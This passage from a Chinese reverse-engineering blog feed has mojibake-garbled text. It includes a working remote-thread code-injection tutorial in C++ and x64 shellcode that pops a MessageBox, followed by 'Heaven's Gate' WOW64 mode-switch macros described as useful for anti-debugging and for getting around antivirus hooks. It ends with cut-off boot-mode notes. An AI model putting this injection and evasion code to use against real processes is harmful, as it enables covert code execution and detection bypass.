class="params">()</span> </span>&#123;</span><br><span class="line"><span class="built_in">MessageBoxA</span>(<span class="literal">NULL</span>, <span class="string">&quot;hello&quot;</span>, <span class="string">&quot;SUCCESS&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">targetCode</span><span class="params">(Data* data)</span> </span>&#123;</span><br><span class="line"><span class="type">char</span> user32[] = &#123; <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;\0&#x27;</span> &#125;;</span><br><span class="line"><span class="type">char</span> messageBox[] = &#123; <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;\0&#x27;</span> &#125;;</span><br><span class="line">HMODULE hModule = ((<span class="built_in">HMODULE</span>(*)(<span class="type">char</span>*))(data-&gt;pLoadLibraryA))(user32);</span><br><span class="line"><span class="keyword">if</span> (!hModule)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">LPVOID pMessagebox = ((<span class="built_in">FARPROC</span>(*)(HMODULE, LPCSTR))(data-&gt;pGetProcAddress))(hModule, messageBox);</span><br><span class="line">((<span class="built_in">int</span> (*)(HWND, LPCSTR, LPCSTR, UINT))pMessagebox)(<span class="literal">NULL</span>, (<span class="type">char</span>*)(data-&gt;pMassage), (<span class="type">char</span>*)(data-&gt;pMassage), MB_OKCANCEL);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//è·å–ç›®æ ‡å¥æŸ„</span></span><br><span class="line"><span class="comment">//ç”³è¯·ç©ºé—´ï¼Œå†™å…¥å‚æ•°</span></span><br><span class="line"><span class="comment">//ç”³è¯·ç©ºé—´å†™å…¥å‡½æ•°</span></span><br><span class="line"><span class="comment">//è¿œç¨‹çº¿ç¨‹æ‰§è¡Œ</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">injectCode</span><span class="params">(DWORD pid)</span> </span>&#123;</span><br><span class="line">HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> message[] = <span class="string">&quot;SUCCESS&quot;</span>;</span><br><span class="line">LPVOID pMessage = <span class="built_in">writeMemory</span>(hProcess, message, <span class="built_in">sizeof</span>(message) + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data.pMassage = (DWORD64)pMessage;</span><br><span class="line">data.pGetProcAddress = (DWORD64)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;kernel32&quot;</span>), <span class="string">&quot;GetProcAddress&quot;</span>);</span><br><span class="line">data.pLoadLibraryA = (DWORD64)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;kernel32&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line"></span><br><span class="line">LPVOID pData = <span class="built_in">writeMemory</span>(hProcess, &amp;data, <span class="built_in">sizeof</span>(data) + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">uintptr_t</span> funcSize = (<span class="type">uintptr_t</span>)writeMemory - (<span class="type">uintptr_t</span>)targetCode;</span><br><span class="line"></span><br><span class="line">LPVOID pfunc = <span class="built_in">writeMemory</span>(hProcess, (PVOID)targetCode, funcSize);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HANDLE hThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)pfunc, pData, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">DWORD pid;</span><br><span class="line">std::cin &gt;&gt; pid;</span><br><span class="line"></span><br><span class="line"><span class="comment">//pid = atol(argv[1]);</span></span><br><span class="line"><span class="built_in">injectCode</span>(pid);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å…¶ä¸­targetCodeæ˜¯å†™å…¥è¿›ç¨‹çš„å‡½æ•°ï¼Œ<br>uintptr_t funcSize = (uintptr_t)writeMemory - (uintptr_t)targetCode;çš„åŸå› æ˜¯æˆ‘ç¼–è¯‘ä¹‹åçœ‹äº†ä¸€ä¸‹åç¼–è¯‘ç»“æœï¼Œå‘ç°æ˜¯è¿™ä¸¤ä¸ªå‡½æ•°æŒ¨åœ¨ä¸€èµ·ï¼Œé‚£ä¹ˆé¦–åœ°å€ç›¸å‡å°±æ˜¯å¤§å°äº†ã€‚</p><h2 id="å®è·µASM">å®è·µASM</h2><p>å®é™…ä¸Šï¼Œä¸€èˆ¬æ¥è¯´ï¼Œä»£ç æ³¨å…¥éƒ½æ˜¯æ³¨å…¥æ±‡ç¼–ä»£ç ï¼Œå› ä¸ºæ±‡ç¼–ä»£ç å¯ä»¥æ›´æ–¹ä¾¿åœ°å’Œå¯„å­˜å™¨ï¼Œå†…å­˜ç©ºé—´è¿›è¡Œäº¤äº’</p><p>å¦‚æœè¦ç›´æ¥ç”¨æ±‡ç¼–æ¥å®Œæˆæ“ä½œï¼Œæ­¥éª¤ä¸ºï¼š</p><p>å°†æ‰§è¡Œçš„å‡½æ•°å†™ä¸ºshellcodeï¼Œç„¶ååˆ›å»ºè¿œç¨‹çº¿ç¨‹æ‰§è¡Œï¼Œè¿™é‡Œå¯ä»¥ç›´æ¥æŠŠæ•°æ®å’Œä»£ç å†™åœ¨ä¸€èµ·ä¼ é€’</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> keystone <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">code = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">jmp code;</span></span><br><span class="line"><span class="string">user32:</span></span><br><span class="line"><span class="string">.asciz &quot;user32.dll&quot;;</span></span><br><span class="line"><span class="string">messageboxa:</span></span><br><span class="line"><span class="string">.asciz &quot;MessageBoxA&quot;;</span></span><br><span class="line"><span class="string">message:</span></span><br><span class="line"><span class="string">.asciz &quot;SUCCESS&quot;;</span></span><br><span class="line"><span class="string">pLoadLibraryA:</span></span><br><span class="line"><span class="string">.quad 0x00007FFD20BC9460;</span></span><br><span class="line"><span class="string">pGetProcessAddress:</span></span><br><span class="line"><span class="string">.quad 0x00007FFD20BC3C30;</span></span><br><span class="line"><span class="string">code:</span></span><br><span class="line"><span class="string">push 0;</span></span><br><span class="line"><span class="string">lea rcx,[rip + rip - user32];</span></span><br><span class="line"><span class="string">mov rax,[rip + rip - pLoadLibraryA];</span></span><br><span class="line"><span class="string">call rax;</span></span><br><span class="line"><span class="string">mov rcx,rax;</span></span><br><span class="line"><span class="string">lea rdx,[rip + rip - messageboxa];</span></span><br><span class="line"><span class="string">mov rax,[rip + rip - pGetProcessAddress];</span></span><br><span class="line"><span class="string">call rax;</span></span><br><span class="line"><span class="string">lea rbx,[rip + rip - message];</span></span><br><span class="line"><span class="string">mov r9,1;</span></span><br><span class="line"><span class="string">mov r8,rbx;</span></span><br><span class="line"><span class="string">mov rdx,rbx;</span></span><br><span class="line"><span class="string">mov rcx, 0;</span></span><br><span class="line"><span class="string">call rax;</span></span><br><span class="line"><span class="string">ret;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pasm</span>(<span class="params">code_list</span>):</span><br><span class="line">    code_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    code_str += <span class="string">&#x27;__asm&#123;\n&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> code_list:</span><br><span class="line">        code_str += <span class="string">f&quot;_emit 0x<span class="subst">&#123;<span class="built_in">hex</span>(num)[<span class="number">2</span>:].zfill(<span class="number">2</span>)&#125;</span>;\n&quot;</span></span><br><span class="line">    code_str += <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(code_str)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ks = Ks(KS_ARCH_X86, KS_MODE_64)</span><br><span class="line">outcode,count = ks.asm(code)</span><br><span class="line"></span><br><span class="line">phex(outcode)</span><br><span class="line"><span class="comment"># pasm(outcode)</span></span><br></pre></td></tr></table></figure><p>è¿™æ®µæ±‡ç¼–æ€»èƒ½å‡ºç°ä¸€äº›å¥‡æ€ªçš„bugï¼Œè¦æ³¨æ„æ ˆå¹³è¡¡å’Œè°ƒç”¨å‡½æ•°æ—¶æ ˆæœ€åä¸€ä½ä¸º0ï¼Œleaå’Œmovä»€ä¹ˆæ—¶å€™ä¼ å€¼ä»€ä¹ˆæ—¶å€™ä¼ åœ°å€ï¼Œä»¥åŠx64ä¸‹çš„åŸºæœ¬è°ƒç”¨æ–¹å¼ã€‚ä¸ç®¡æˆ‘å†™æ²¡å†™åé¢çš„popï¼Œç¨‹åºéƒ½ä¼šå´©æºƒä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œä½†æ˜¯messageboxç¡®å®å¼¹å‡ºäº†ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">injectCodeAsm</span><span class="params">(DWORD pid)</span> </span>&#123;</span><br><span class="line">HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line"></span><br><span class="line">BYTE code[] = &#123; <span class="number">0xeb</span>, <span class="number">0x2f</span>, <span class="number">0x75</span>, <span class="number">0x73</span>, <span class="number">0x65</span>, <span class="number">0x72</span>, <span class="number">0x33</span>, <span class="number">0x32</span>, <span class="number">0x2e</span>, <span class="number">0x64</span>, <span class="number">0x6c</span>, <span class="number">0x6c</span>, <span class="number">0x00</span>, <span class="number">0x4d</span>, <span class="number">0x65</span>, <span class="number">0x73</span>, <span class="number">0x73</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x65</span>, <span class="number">0x42</span>, <span class="number">0x6f</span>, <span class="number">0x78</span>, <span class="number">0x41</span>, <span class="number">0x00</span>, <span class="number">0x53</span>, <span class="number">0x55</span>, <span class="number">0x43</span>, <span class="number">0x43</span>, <span class="number">0x45</span>, <span class="number">0x53</span>, <span class="number">0x53</span>, <span class="number">0x00</span>, <span class="number">0x60</span>, <span class="number">0x94</span>, <span class="number">0xbc</span>, <span class="number">0x20</span>, <span class="number">0xfd</span>, <span class="number">0x7f</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x30</span>, <span class="number">0x3c</span>, <span class="number">0xbc</span>, <span class="number">0x20</span>, <span class="number">0xfd</span>, <span class="number">0x7f</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x6a</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8d</span>, <span class="number">0x0d</span>, <span class="number">0xc8</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x05</span>, <span class="number">0xe0</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xd0</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xc1</span>, <span class="number">0x48</span>, <span class="number">0x8d</span>, <span class="number">0x15</span>, <span class="number">0xc0</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x05</span>, <span class="number">0xd5</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xd0</span>, <span class="number">0x48</span>, <span class="number">0x8d</span>, <span class="number">0x1d</span>, <span class="number">0xbc</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0x49</span>, <span class="number">0xc7</span>, <span class="number">0xc1</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xd8</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xda</span>, <span class="number">0x48</span>, <span class="number">0xc7</span>, <span class="number">0xc1</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xff</span>, <span class="number">0xd0</span>, <span class="number">0xc3</span> &#125;;</span><br><span class="line">LPVOID pcode = <span class="built_in">writeMemory</span>(hProcess, code, <span class="built_in">sizeof</span>(code));</span><br><span class="line"></span><br><span class="line">HANDLE hThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)pcode, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">DWORD pid;</span><br><span class="line">std::cin &gt;&gt; pid;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//pid = atol(argv[1]);</span></span><br><span class="line"><span class="built_in">injectCodeAsm</span>(pid);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> é€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç† </category>
          
          <category> çŸ¥è¯†é›† </category>
          
          <category> é€†å‘ </category>
          
          <category> æŠ€èƒ½ </category>
          
          <category> ä»£ç æ³¨å…¥ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¤©å ‚ä¹‹é—¨ç ”ç©¶</title>
      <link href="/posts/4ca4211.html"/>
      <url>/posts/4ca4211.html</url>
      
        <content type="html"><![CDATA[<h2 id="å¤©å ‚ä¹‹é—¨">å¤©å ‚ä¹‹é—¨</h2><p>åœ¨32ä½è¿›ç¨‹ä¸­ï¼Œè°ƒç”¨32ä½ç³»ç»Ÿå‡½æ•°çš„æ“ä½œæ˜¯é€šè¿‡WOW64å®ç°çš„ã€‚WOW64åœ¨å†…éƒ¨è½¬æ¢ä¸º64ä½ï¼Œç„¶åè¿›è¡Œ64ä½DLLçš„è°ƒç”¨ï¼Œä»è€Œå®ç°äº†åœ¨64ä½æœºä¸Šå…¼å®¹è¿è¡Œ32ä½çš„æ“ä½œã€‚</p><p>åœ¨é•¿æ¨¡å¼ä¸‹ï¼Œæ®µå¯„å­˜å™¨ç”¨ä½œæƒé™å’Œæ ‡å¿—çš„åŒºåˆ†<br>ä½¿ç”¨WinDbgè¿›è¡Œè°ƒè¯•ï¼š</p><p>CS:23-&gt;gdtåç§»:4*8 = 20<br>CS:33-&gt;gdtåç§»:6*8 = 30</p><p><img src="https://s2.loli.net/2024/12/29/PhAFVyJl6iIqtLv.png" alt="image-20241229225553947"></p><p>å¯ä»¥çœ‹å‡º23æŒ‡å‘çš„æ®µæè¿°ç¬¦çš„Longä½ä¸ºNLï¼Œè€Œ33æŒ‡å‘çš„ä¸ºLoï¼Œè¯´æ˜33æŒ‡å‘çš„æ˜¯64ä½åŒºåŸŸï¼Œ23æŒ‡å‘çš„æ˜¯32ä½åŒºåŸŸ</p><p>å¯¹äºä¸åŒçš„æ®µé€‰æ‹©å­ï¼ŒCPUä¼šé€‰æ‹©å¯¹åº”çš„æœºå™¨ç è§£é‡Šæ–¹å¼å»ç¿»è¯‘æœºå™¨ç ã€‚<br>åœ¨è½¯ä»¶ä¸Šï¼Œæœ‰å¯¹åº”çš„32ä½å‡½æ•°å®ç°32åˆ°64çš„è½¬æ¢ç„¶åè¿›å…¥64ä½çš„æ“ä½œç³»ç»Ÿå†…æ ¸ï¼Œå› ä¸º(64ä½çš„æ“ä½œç³»ç»Ÿä¸€å®šæ˜¯64ä½çš„ï¼Œè¦æ‰§è¡Œå†…æ ¸ä»£ç å¿…é¡»å…ˆè½¬ä¸º64ä½æ‰§è¡Œ)</p><h3 id="WOW64">WOW64</h3><p>åŸºæœ¬è°ƒç”¨æµç¨‹ï¼š<br>32ä½è¿›ç¨‹è°ƒç”¨32ä½ç³»ç»ŸAPIï¼Œå…¶ä¸­ç³»ç»ŸAPIè°ƒç”¨<code>dword ptr fs:[000000C0]</code>ï¼Œå³TEBè¡¨åç§»C0çš„WOW32Reservedï¼Œç¬¬ä¸€è¡Œä»£ç ä¸ºjmp     0033:77877009ï¼Œè¡¨æ˜å…ˆåˆ‡æ¢ä¸º64ä½ï¼Œç„¶åè·³è½¬åˆ°77877009ï¼Œä½äºwow64cpu.dllä¸­ï¼Œé¦–å…ˆä¿å­˜äº†ç¯å¢ƒå †æ ˆï¼Œç„¶ååˆ‡æ¢ä¸º64ä¸ºçš„å †æ ˆ<br>æœ€åé€šè¿‡<code>jmp     qword ptr [r15+rcx*8]</code>æ‰§è¡Œå‡½æ•°è°ƒç”¨ï¼Œr15ä¸ºå‡½æ•°è¡¨ï¼Œrcxä¸ºåç§»</p><p>[<a href="https://bbs.kanxue.com/thread-221236.htm">åˆ†äº«][åŸåˆ›]æ±‡ç¼–é‡Œçœ‹Wow64çš„åŸç†ï¼ˆæµ…è°ˆ32ä½ç¨‹åºæ˜¯æ€æ ·åœ¨windows 64ä¸Šè¿è¡Œçš„ï¼Ÿï¼‰-è½¯ä»¶é€†å‘-çœ‹é›ª-å®‰å…¨ç¤¾åŒº|å®‰å…¨æ‹›è˜|kanxue.com</a></p><h3 id="ä½œç”¨">ä½œç”¨</h3><p>åè°ƒè¯•ï¼šå‡ ä¹æ‰€æœ‰è°ƒè¯•å™¨å‡ä¸èƒ½æ­£å¸¸è°ƒè¯•åˆ‡æ¢åçš„ä»£ç <br>é˜²é’©å­ï¼šå¦‚æœæ€è½¯åªå¯¹32ä½DLLæ‰§è¡Œäº†Hookï¼Œé‚£ä¹ˆè¿™ä¸ªæ–¹æ³•å¯ä»¥ç›´æ¥ç»•è¿‡32ä½å…¥å£ç›´æ¥è°ƒç”¨64ä½å‡½æ•°ã€‚</p><h3 id="å®ç°">å®ç°</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> SWITCH_TO_X64  \</span></span><br><span class="line"><span class="meta">do &#123;               \</span></span><br><span class="line"><span class="meta">__asm push 0x33       \</span></span><br><span class="line"><span class="meta">__asm _emit 0xE8 \</span></span><br><span class="line"><span class="meta">__asm _emit 0x00 \</span></span><br><span class="line"><span class="meta">__asm _emit 0x00 \</span></span><br><span class="line"><span class="meta">__asm _emit 0x00 \</span></span><br><span class="line"><span class="meta">__asm _emit 0x00 \</span></span><br><span class="line"><span class="meta">__asm add dword ptr [esp], 5 \</span></span><br><span class="line"><span class="meta">__asm retf            \</span></span><br><span class="line"><span class="meta">&#125; while (0)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWITCH_TO_X86  \</span></span><br><span class="line"><span class="meta">do &#123;               \</span></span><br><span class="line"><span class="meta">__asm _emit 0xE8 <span class="comment">/* call $+5 */</span> \</span></span><br><span class="line"><span class="meta">__asm _emit 0x00 \</span></span><br><span class="line"><span class="meta">__asm _emit 0x00 \</span></span><br><span class="line"><span class="meta">__asm _emit 0x00 \</span></span><br><span class="line"><span class="meta">__asm _emit 0x00 \</span></span><br><span class="line"><span class="meta">__asm _emit 0xC7 <span class="comment">/* mov dword [rsp+4], 0x23 */</span> \</span></span><br><span class="line"><span class="meta">__asm _emit 0x44 \</span></span><br><span class="line"><span class="meta">__asm _emit 0x24 \</span></span><br><span class="line"><span class="meta">__asm _emit 0x04 \</span></span><br><span class="line"><span class="meta">__asm _emit 0x23 \</span></span><br><span class="line"><span class="meta">__asm _emit 0x00 \</span></span><br><span class="line"><span class="meta">__asm _emit 0x00 \</span></span><br><span class="line"><span class="meta">__asm _emit 0x00 \</span></span><br><span class="line"><span class="meta">__asm _emit 0x83 <span class="comment">/* add dword [rsp], 0xD */</span> \</span></span><br><span class="line"><span class="meta">__asm _emit 0x04 \</span></span><br><span class="line"><span class="meta">__asm _emit 0x24 \</span></span><br><span class="line"><span class="meta">__asm _emit 0x0D \</span></span><br><span class="line"><span class="meta">__asm _emit 0xCB <span class="comment">/* retf */</span> \</span></span><br><span class="line"><span class="meta">&#125; while (0)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åˆ‡æ¢ä¸º64ä½æ—¶ï¼Œéœ€è¦ä½¿ç”¨64ä½æ±‡ç¼–çš„ç«‹å³æ•°ï¼Œæˆ‘æ„Ÿè§‰å¯ä»¥åˆ›å»ºå‡ ä¸ªè¾…åŠ©çš„64ä½DLLå¸®æˆ‘æ‰§è¡Œé‚£äº›å‡½æ•°</p><p>å¯¹äºåè°ƒè¯•çš„ä½œç”¨ï¼Œè‡ªç„¶æ˜¯å·²ç»å®ç°äº†ï¼Œå¦‚æœè¦å®ç°ä¸ä½¿ç”¨WOW64å»æ‰§è¡Œå‡½æ•°ï¼Œéœ€è¦ä»¥ä¸‹æ“ä½œï¼š</p><ul><li>åˆ‡æ¢è¿›ç¨‹åˆ°64ä½</li><li>è·å–gs:[60h]å¾—åˆ°PEB</li><li>éå†ldrçš„InMemoryOrderModuleListæ‰¾åˆ°Ntdll64çš„æ¨¡å—åœ°å€</li><li>åœ¨Ntdllä¸­è·å–éœ€è¦çš„å‡½æ•°è¿›è¡Œæ“ä½œ</li></ul><p>å¦‚æœä¸æ˜¯Ntdllä¸­çš„å‡½æ•°ï¼Œéœ€è¦æ‰¾åˆ°Ntdllä¸­çš„LdrLoadDllå‡½æ•°ï¼Œåœ¨64ä½ä¸­æ‰§è¡ŒåŠ è½½åº“å‡½æ•°æ“ä½œï¼Œç„¶åå–å‡½æ•°åœ°å€å¹¶æ‰§è¡Œã€‚</p><p>è¿™ä¸ªéƒ¨åˆ†æ±‡ç¼–å†™å¾—å¤ªæ¶å¿ƒäº†ï¼Œä¹‹åå†å®ç°å§QAQ</p>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯†é›† </category>
          
          <category> é€†å‘ </category>
          
          <category> æŠ€èƒ½ </category>
          
          <category> åè°ƒè¯• </category>
          
          <category> å¤©å ‚ä¹‹é—¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re </tag>
            
            <tag> WOW64 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>win-è®¡ç®—æœºå¯åŠ¨æ—¶çš„æ¨¡å¼è¿‡æ¸¡</title>
      <link href="/posts/bb94a573.html"/>
      <url>/posts/bb94a573.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://zhuanlan.zhihu.com/p/673712331">ç¬¬å››ç«  å¤„ç†å™¨æ¨¡å¼ä¸ç¡¬ä»¶å†…å­˜ç®¡ç†(x86_64) - ä»é›¶å¼€å§‹å¼€å‘UEFIå¼•å¯¼çš„64ä½æ“ä½œç³»ç»Ÿå†…æ ¸ - çŸ¥ä¹</a></p><p>æœ¬æ–‡ä¸ºä¸Šé¢è¿™ä¸ªç½‘å€çš„æ‘˜æŠ„</p><p><img src="https://s2.loli.net/2024/12/27/Lzi1KnslSqB2hmu.png" alt="image-20241227011304326"></p><h2 id="å‡ ç§æ¨¡å¼">å‡ ç§æ¨¡å¼</h2><h3 id="å®æ¨¡å¼">å®æ¨¡å¼</h3><blockquote><p>å¤„ç†ä½æ•°è¢«è®¾ä¸º16ä½ã€‚åœ¨è¿™ä¸ªæ¨¡å¼ä¸­ï¼Œå¤„ç†å™¨åªèƒ½è®¿é—®ç‰©ç†åœ°å€çš„å‰1MBç©ºé—´ï¼Œé€šè¿‡æ®µå¯„å­˜å™¨å·¦ç§»4ä½åä¸ä¸€ä¸ª16ä½åœ°å€ç›¸åŠ å¾—åˆ°çš„20ä½åœ°å€è®¿é—®ã€‚</p></blockquote><h3 id="32ä½å®æ¨¡å¼">32ä½å®æ¨¡å¼</h3><blockquote><p>ä¸å¼€å¯ä¿æŠ¤æ¨¡å¼çš„32ä½æ¨¡å¼æ˜¯ä¸ç¨³å®šçš„ï¼Œå¤„ç†å™¨åªèƒ½æš‚æ—¶å¤„äº<code>32ä½å®æ¨¡å¼</code>çš„çŠ¶æ€ï¼Œéœ€è¦å¼€å¯ä¿æŠ¤æ¨¡å¼æ‰èƒ½æ­£å¸¸æ‰§è¡Œ32ä½ç¨‹åºã€‚</p></blockquote><h3 id="ä¿æŠ¤æ¨¡å¼">ä¿æŠ¤æ¨¡å¼</h3><blockquote><p>å‡†å¤‡ä¿æŠ¤æ¨¡å¼æ•°æ®ç»“æ„åå°†<code>cr0</code>å¯„å­˜å™¨çš„<code>PE</code>æ ‡å¿—ä½ç½®ä½å³å¯å¼€å¯ã€‚è¿™ä¸ªâ€œä¿æŠ¤æ¨¡å¼æ•°æ®ç»“æ„â€æŒ‡çš„æ˜¯<code>GDT</code>ï¼Œå…¨å±€æè¿°ç¬¦è¡¨ï¼Œè¡¨ä¸­å¯ä»¥æ·»åŠ 